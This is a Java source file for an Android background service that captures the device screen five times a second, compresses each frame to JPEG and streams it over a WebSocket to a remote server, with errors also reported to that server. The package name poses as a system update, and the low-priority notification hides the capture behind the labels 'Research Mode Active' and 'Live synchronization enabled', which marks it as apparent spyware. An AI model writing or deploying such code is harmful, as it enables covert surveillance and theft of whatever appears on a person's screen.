package com.android.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class ScreenStreamService extends Service {

    private static final String TAG = "ScreenStream";
    private static final int FPS = 5;
    private static final int JPEG_QUALITY = 50;
    private static final int SCALE_DIVIDER = 2; // Resize for bandwidth

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private WebSocket webSocket;
    private Handler handler;
    private boolean isStreaming = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (isStreaming) return START_STICKY;

        startForeground(998, createNotification());

        int resultCode = intent.getIntExtra("resultCode", -1);
        Intent data = intent.getParcelableExtra("data");

        MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        mediaProjection = mpManager.getMediaProjection(resultCode, data);

        if (mediaProjection != null) {
            setupStreaming();
        } else {
            stopSelf();
        }

        return START_STICKY;
    }

    private void setupStreaming() {
        isStreaming = true;
        
        // Setup Screen Capture
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        int width = metrics.widthPixels / SCALE_DIVIDER;
        int height = metrics.heightPixels / SCALE_DIVIDER;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay(TAG, width, height, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);

        // Setup WebSocket
        OkHttpClient client = new OkHttpClient();
        String wsUrl = ServerConfig.BASE_URL.replace("http", "ws");
        Request request = new Request.Builder().url(wsUrl).build();
        
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, okhttp3.Response response) {
                Log.d(TAG, "WS Connected");
                startCaptureLoop();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, @Nullable okhttp3.Response response) {
                Log.e(TAG, "WS Failed: " + t.getMessage());
                stopStreaming();
            }
        });
    }

    private void startCaptureLoop() {
        handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!isStreaming) return;
                captureAndSend();
                handler.postDelayed(this, 1000 / FPS);
            }
        });
    }

    private void captureAndSend() {
        try {
            Image image = imageReader.acquireLatestImage();
            if (image == null) return;

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();

            Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, 
                                              image.getHeight(), Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            image.close();

            // Compress to JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
            byte[] jpegData = baos.toByteArray();
            bitmap.recycle();

            // Send via WebSocket
            if (webSocket != null) {
                webSocket.send(ByteString.of(jpegData));
            }

        } catch (Exception e) {
            Log.e(TAG, "Capture error: " + e.getMessage());
            UploadHelper.sendTextToServer(getApplicationContext(), "error", "ScreenStream Frame Error: " + e.getMessage());
        }
    }

    private void stopStreaming() {
        isStreaming = false;
        if (webSocket != null) webSocket.close(1000, "User Stop");
        if (virtualDisplay != null) virtualDisplay.release();
        if (mediaProjection != null) mediaProjection.stop();
        if (imageReader != null) imageReader.close();
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        stopStreaming();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }

    private Notification createNotification() {
        String channelId = "stream_channel";
        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            nm.createNotificationChannel(new NotificationChannel(channelId, "Stream", NotificationManager.IMPORTANCE_LOW));
        }
        return new NotificationCompat.Builder(this, channelId)
                .setContentTitle("Research Mode Active")
                .setContentText("Live synchronization enabled")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }
}
